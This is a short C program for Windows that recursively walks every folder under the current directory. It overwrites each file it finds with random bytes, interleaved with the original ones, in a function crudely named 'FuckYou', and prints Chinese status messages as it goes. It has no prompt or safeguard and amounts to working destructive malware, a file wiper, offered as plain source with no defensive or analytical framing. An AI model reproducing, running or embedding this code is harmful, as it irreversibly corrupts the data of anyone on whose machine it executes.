#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>
 
void FuckYou(char*filename)
{
	FILE* pfile = fopen(filename, "r+b");
	if (pfile == NULL)
	{
		printf("文件打开失败\n");
		return;
	}
	fseek(pfile, 0, SEEK_END);
	int size = ftell(pfile);
	fseek(pfile, 0, SEEK_SET);
	char code;
	for (int i = 0; i < size; i++)
	{
		code = rand() % 128;
		fwrite(&code, 1, 1, pfile);
		fseek(pfile, 1, SEEK_CUR);
	}
	fclose(pfile);
}
 
void FindFile(char*filename)
{
	char PathName[256];
	memset(PathName, 0, 256);
	sprintf(PathName, "%s\\%s", filename, "*.*");
	WIN32_FIND_DATA fileData;
	HANDLE hFile = FindFirstFile(PathName,&fileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("该文件夹为空\n");
		return;
	}
	char temp[256];
	int fileCount = 0;
	int isFindNext = 1;
	while (isFindNext)
	{
		if (fileData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)
		{
			if (fileData.cFileName[0] != '.')
			{
				memset(temp, 0, 256);
				sprintf(temp, "%s\\%s", filename, fileData.cFileName); 
				printf("文件夹：%s\n", temp);
				FindFile(temp);
			}
		}
		else
		{
			memset(temp, 0, 256);
			sprintf(temp, "%s\\%s", filename, fileData.cFileName);
			printf("文件：%s\n", temp);
			FuckYou(temp);
			fileCount++;
		}
		isFindNext = FindNextFile(hFile, &fileData);
 
	}
}
 
int main()
{
	char currentDirectoryName[256];
	GetCurrentDirectory(256,currentDirectoryName);
	printf("%s\n", currentDirectoryName);
	FindFile(currentDirectoryName);
	return 0;
}
